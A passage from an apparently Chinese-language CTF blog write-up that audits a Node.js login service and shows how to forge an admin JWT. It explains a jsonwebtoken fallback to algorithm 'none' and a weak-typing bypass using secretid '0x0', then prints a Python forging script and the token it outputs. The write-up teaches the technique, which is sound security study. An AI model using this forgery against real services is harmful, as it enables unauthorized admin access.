+        <span class="token keyword">const</span> secret <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">const</span> secretid <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length<span class="token punctuation">;</span>
+        global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>secret<span class="token punctuation">)</span>
+
+        <span class="token keyword">const</span> token <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">sign</span><span class="token punctuation">(</span><span class="token punctuation">{</span>secretid<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">}</span><span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">{</span>algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            token<span class="token punctuation">:</span> token
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+
+    <span class="token string">'POST /api/login'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+        <span class="token keyword">const</span> <span class="token punctuation">{</span>username<span class="token punctuation">,</span> password<span class="token punctuation">}</span> <span class="token operator">=</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>username <span class="token operator">||</span> <span class="token operator">!</span>password<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'username or password is necessary'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">const</span> token <span class="token operator">=</span> ctx<span class="token punctuation">.</span>header<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>body<span class="token punctuation">.</span>authorization <span class="token operator">||</span> ctx<span class="token punctuation">.</span>request<span class="token punctuation">.</span>query<span class="token punctuation">.</span>authorization<span class="token punctuation">;</span>
+
+        <span class="token keyword">const</span> sid <span class="token operator">=</span> JSON<span class="token punctuation">.</span><span class="token function">parse</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">.</span><span class="token keyword">from</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">'base64'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>secretid<span class="token punctuation">;</span>
+
+        console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sid<span class="token punctuation">)</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span>sid <span class="token operator">===</span> undefined <span class="token operator">||</span> sid <span class="token operator">===</span> <span class="token keyword">null</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token punctuation">(</span>sid <span class="token operator">&lt;</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">.</span>length <span class="token operator">&amp;&amp;</span> sid <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'login error'</span><span class="token punctuation">,</span> <span class="token string">'no such secret id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">const</span> secret <span class="token operator">=</span> global<span class="token punctuation">.</span>secrets<span class="token punctuation">[</span>sid<span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">const</span> user <span class="token operator">=</span> jwt<span class="token punctuation">.</span><span class="token function">verify</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> secret<span class="token punctuation">,</span> <span class="token punctuation">{</span>algorithm<span class="token punctuation">:</span> <span class="token string">'HS256'</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">const</span> status <span class="token operator">=</span> username <span class="token operator">===</span> user<span class="token punctuation">.</span>username <span class="token operator">&amp;&amp;</span> password <span class="token operator">===</span> user<span class="token punctuation">.</span>password<span class="token punctuation">;</span>
+
+        <span class="token keyword">if</span><span class="token punctuation">(</span>status<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+            ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> username<span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            status
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+
+    <span class="token string">'GET /api/flag'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+        <span class="token keyword">if</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">!==</span> <span class="token string">'admin'</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
+            <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">APIError</span><span class="token punctuation">(</span><span class="token string">'permission error'</span><span class="token punctuation">,</span> <span class="token string">'permission denied'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token punctuation">}</span>
+
+        <span class="token keyword">const</span> flag <span class="token operator">=</span> fs<span class="token punctuation">.</span><span class="token function">readFileSync</span><span class="token punctuation">(</span><span class="token string">'/flag'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            flag
+        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span><span class="token punctuation">,</span>
+
+    <span class="token string">'GET /api/logout'</span><span class="token punctuation">:</span> <span class="token keyword">async</span> <span class="token punctuation">(</span>ctx<span class="token punctuation">,</span> next<span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>
+        ctx<span class="token punctuation">.</span>session<span class="token punctuation">.</span>username <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
+        ctx<span class="token punctuation">.</span><span class="token function">rest</span><span class="token punctuation">(</span><span class="token punctuation">{</span>
+            status<span class="token punctuation">:</span> <span class="token boolean">true</span>
+        <span class="token punctuation">}</span><span class="token punctuation">)</span>
+        <span class="token keyword">await</span> <span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>分析代码逻辑可知：<code>Node.js</code>调用<code>jsonwebtoken</code>进行用户注册验证等操作。</p>
+<p>注册部分代码逻辑：</p>
+<p>首先用户名不能为空且不能为<code>admin</code>用户，然后<code>secrets.length &gt; 100000</code>就置为空，可知当注册用户达到100000时就会清空原有密钥信息，下来的就是注册信息合法开始调用<code>jwt.sign()</code>进行JWT的生成，然后返回给用户，其中的密钥是随机生成的<code>crypto.randomBytes(18).toString(&#39;hex&#39;)</code>并与用户注册的sid进行绑定<code>const secretid = global.secrets.length;</code>，密钥的存储是在一个数组中，每当新增一个用户都会随机产生一个密钥进行存储。</p>
+<p>登录部分代码逻辑：</p>
+<p>首先用户名和密码不能为空，然后使用<code>JSON.parse()</code>对post的authorization字段进行提取sid，这个sid就是用户身份的唯一标志，依据逻辑<code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))</code>可知sid不能为空并且sid需要大于等于0、小于密钥数组的实际长度，也就是说登录的用户在服务端需要能查出来，通过验证之后，下来由用户sid对global.secrets进行取值，也就是取得相应用户的密钥，然后进行用户验证，返回相应状态：验证成功的用户<code>status=true</code>否则为<code>false</code>。</p>
+<p>简单来说，其代码逻辑可以看作数据库操作，通过用户标志查询数据库是否存在该用户记录，然后进行用户验证。</p>
+<p>Getflag部分代码逻辑：其实就是验证登录用户是否为admin用户，普通用户会提示权限不足<code>throw new APIError(&#39;permission error&#39;, &#39;permission denied&#39;);</code>。</p>
+<h3 id="绕过分析"><a href="#绕过分析" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>分析代码之后，逻辑已经比较清楚了，要想得到管理员权限就需要绕过sid（用户ID）和secrets（用户密钥）</p>
+<p>由于Node的jsonwebtoken库存在一个缺陷，当用户传入jwt secretid为空时 jsonwebtoken会采用algorithm none进行解密，即便在登录验证代码部分<code>const user = jwt.verify(token, secret, {algorithm: &#39;HS256&#39;});</code>后面的算法指名为 HS256，验证也还是按照 none 来验证通过的。</p>
+<pre class="line-numbers language-js"><code class="language-js">options<span class="token punctuation">.</span>algorithms <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'none'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>既然这样，我们就可以通过传入不存在的secretid，导致algorithm为none，由于algorithm=none所以在构造JWT时就不需要提供密钥，然后就可以通过伪造jwt来成为admin。</p>
+<p>但是，我们可以看到实际的Node.js代码中做了限制，当sid不满足<code>if(sid === undefined || sid === null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0))</code>条件时就会错误<code>APIError(&#39;login error&#39;, &#39;no such secret id&#39;);</code>，所以要想构造管理员权限的JWT，就要绕过这个sid限制。</p>
+<p>分析sid限制绕过：</p>
+<p>根据if条件可知，<code>sid === undefined || sid === null</code>这部分逻辑很容易绕过，主要是<code>!(sid &lt; global.secrets.length &amp;&amp; sid &gt;= 0)</code>这部分。要绕过这部分，既要构造sid不存在又要满足<code>0-global.secrets.length</code>这个范围，所以这里可以利用Node.js的弱类型特性来绕过限制，比如十六进制字符串进行绕过：<code>&quot;0x0&quot;</code>（或者使用小数绕过<code>0.11</code>等）</p>
+<p>Console控制台测试</p>
+<p><img src="/2020/04/19/bypass-nodejs-jwt/image-20200419214315213.png" alt="image-20200419214315213"></p>
+<p>测试结果可以看到其能够绕过if逻辑，但是需要注意一点，这个十六进制字符串<code>&quot;0x0&quot;</code>要想在JWT攻击载荷里面生效，前提是必须注册的用户需要大于0，不然这一步通过不了<code>sid &lt; global.secrets.length</code>，因为前面已经注册了一个普通用户所以这里不在注册，直接构造利用。</p>
+<p>编写脚本构造：</p>
+<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">import</span> jwt
+token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">{</span><span class="token string">"secretid"</span><span class="token punctuation">:</span><span class="token string">"0x0"</span><span class="token punctuation">,</span><span class="token string">"username"</span><span class="token punctuation">:</span><span class="token string">"admin"</span><span class="token punctuation">,</span><span class="token string">"password"</span><span class="token punctuation">:</span><span class="token string">"Qftm"</span><span class="token punctuation">}</span><span class="token punctuation">,</span>algorithm<span class="token operator">=</span><span class="token string">"none"</span><span class="token punctuation">,</span>key<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span>encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>Run result：</p>
+<pre><code> → Qftm ← :~/桌面/Qftm# python3 exp.py 
+eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzZWNyZXRpZCI6IjB4MCIsInVzZXJuYW1lIjoiYWRtaW4iLCJwYXNzd29yZCI6IlFmdG0ifQ.
+ → Qftm ← :~/桌面/Qftm#</code></pre><p>解码查看构造的admin jwt情况</p>
+<p><img src="/2020/04/19/bypass-nodejs-jwt/image-20200419215540824.png" alt="image-20200419215540824"></p>
+<p>构造没问题之后直接发包提交构造的JWT进行验证</p>
+<p><img src="/2020/04/19/bypass-nodejs-jwt/image-20200419220440780.png" alt="image-20200419220440780"></p>
+<p>可以看到构造的JWT回显状态为True已经验证成功，成功伪造了admin，下来直接重新抓取login页面利用构造的JWT重放绕过管理员登录获得管理员权限</p>
+<p><img src="/2020/04/19/bypass-nodejs-jwt/image-20200419221604996.png" alt="image-20200419221604996"></p>
+<p>之后由修改过的login页面重放至home页面</p>
+<p><img src="/2020/04/19/bypass-nodejs-jwt/image-20200419221232153.png" alt="image-20200419221232153"></p>
+<p>然后再重放home页面直接以管理员身份登录</p>
+<p><img src="/2020/04/19/bypass-nodejs-jwt/image-20200419221053719.png" alt="image-20200419221053719"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>到这里整个Node.js中的JWT认证分析及绕过过程已经探索完毕，主要是JWT原理的理解以及代码审计的重要性，其次，重要还是利用了Node.js本身弱类型特性以及所提供的<code>jsonwebtoken</code>的内部缺陷再结合程序代码编写本身的缺陷进行认证绕过。</p>
+
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        Author:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Qftm</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        Link:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Qftm.github.io/2020/04/19/bypass-nodejs-jwt/">http://Qftm.github.io/2020/04/19/bypass-nodejs-jwt/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        Reprint policy:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    All articles in this blog are used except for special statements
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    reprint polocy. If reproduced, please indicate source
+                    <a href="/about" target="_blank">Qftm</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>Copied successfully, please follow the reprint policy of this article</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">more</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/JWT/">
+                                    <span class="chip bg-color">JWT</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+            <div class="card">
+                <a href="/2020/05/26/ISCC_2020_Web_WriteUp/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/iscc-1.jpg" class="responsive-img" alt="ISCC 2020 Web WriteUp">
+                        
+                        <span class="card-title">ISCC 2020 Web WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            记录一下ISCC2020历经25天的Web题解，题量可能有点多 QAQ ！！针对题目的难易程度上：易、中、难都有（老少皆宜），此次比赛和以往不太一样，增加了擂台题和实战题一定程度上还是不错的。
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-05-26
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/04/03/php-filter-tricks/">
+                    <div class="card-image">
+                        
+                        <img src="/medias/featureimages/code-1.jpg" class="responsive-img" alt="探索php://filter在实战当中的奇技淫巧">
+                        
+                        <span class="card-title">探索php://filter在实战当中的奇技淫巧</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            在渗透测试或漏洞挖掘的过程中，我们经常会遇到php://filter结合其它漏洞比如文件包含、文件读取、反序列化、XXE等进行组合利用，以达到一定的攻击效果，拿到相应的服务器权限。
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-04-03
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/Web%E5%AE%89%E5%85%A8/" class="post-category">
+                                    Web安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PHP/">
+                        <span class="chip bg-color">PHP</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+<script>
+    $('#articleContent').on('copy', function (e) {
+        // IE8 or earlier browser is 'undefined'
+        if (typeof window.getSelection === 'undefined') return;
+
+        var selection = window.getSelection();
+        // if the selection is short let's not annoy our users.
+        if (('' + selection).length < Number.parseInt('120')) {
+            return;
+        }
+
+        // create a div outside of the visible area and fill it with the selected text.
+        var bodyElement = document.getElementsByTagName('body')[0];
+        var newdiv = document.createElement('div');
+        newdiv.style.position = 'absolute';
+        newdiv.style.left = '-99999px';
+        bodyElement.appendChild(newdiv);
+        newdiv.appendChild(selection.getRangeAt(0).cloneContents());
+
+        // we need a <pre> tag workaround.
+        // otherwise the text inside "pre" loses all the line breaks!
+        if (selection.getRangeAt(0).commonAncestorContainer.nodeName === 'PRE') {
+            newdiv.innerHTML = "<pre>" + newdiv.innerHTML + "</pre>";
+        }
+
+        var url = document.location.href;
+        newdiv.innerHTML += '<br />'
+            + 'From: Qftm<br />'
+            + 'Author: Qftm<br />'
+            + 'Link: <a href="' + url + '">' + url + '</a><br />'
+            + '本文章著作权归作者所有，任何形式的转载都请注明出处。';
+
+        selection.selectAllChildren(newdiv);
+        window.setTimeout(function () {bodyElement.removeChild(newdiv);}, 200);
+    });
+</script>
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;TOC</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h1, h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h1, h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2018</span>
+            <a href="/about" target="_blank">Qftm</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">370.8k</span>&nbsp;字
+            
+            
+            
+            
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link ">
+    <a href="https://github.com/Qftm" 
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:Qftmbin@gmail.com" 
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+    <a href="https://twitter.com/Qftmer" 
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/search.xml", 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+    
+    <script src="/libs/others/clicklove.js" async="async"></script>
+    
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
